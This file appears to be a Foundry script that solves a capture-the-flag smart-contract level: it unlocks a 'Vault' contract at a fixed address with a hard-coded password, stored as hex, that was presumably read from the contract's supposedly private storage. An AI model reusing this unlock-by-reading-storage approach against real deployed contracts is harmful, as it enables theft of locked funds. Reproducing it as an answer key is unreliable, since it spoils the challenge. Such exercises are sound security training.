// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "@contracts/Level08.sol";

contract Level8Script is Script {
    Vault level8 = Vault(0x7Fe8c06c26B6267596Ab05585776018B8C23C1ca);

    function run() external {
        vm.startBroadcast();

        console.log("before: ", level8.locked());
        level8.unlock(
            0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        );
        console.log("after: ", level8.locked());

        vm.stopBroadcast();
    }
}
